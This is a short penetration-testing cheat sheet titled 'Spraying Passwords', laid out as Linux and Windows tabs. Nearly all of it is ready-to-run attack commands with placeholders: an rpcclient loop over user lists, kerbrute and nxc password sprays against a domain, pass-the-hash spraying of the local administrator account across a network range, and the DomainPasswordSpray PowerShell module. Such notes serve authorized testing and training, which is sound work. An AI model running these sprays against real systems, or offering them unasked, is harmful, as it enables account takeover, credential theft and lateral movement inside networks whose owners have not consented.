# Spraying Passwords

{% tabs %}
{% tab title="Linux" %}
```shellscript
# Password spray for domain users
for u in $(cat valid_users.txt);do rpcclient -U "$u%<PASS>" -c "getusername;quit" <IP> | grep Authority; done

kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> valid_users.txt <PASS>

nxc smb <IP> -u valid_users.txt -p <PASS> | grep +

# Password spray networks for local admin account password reuse (pass or hash)
nxc smb --local-auth <IP>/<CIDR> -u administrator -H <HASH> | grep +
```
{% endtab %}

{% tab title="Windows" %}
```shellscript
# If we are authenticated to the domain, the tool will automatically generate a 
# user list from Active Directory, query the domain password policy, and exclude 
# user accounts within one attempt of locking out
https://github.com/dafthack/DomainPasswordSpray
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password <PASSWORD> -OutFile spray_success -ErrorAction SilentlyContinue
```
{% endtab %}
{% endtabs %}
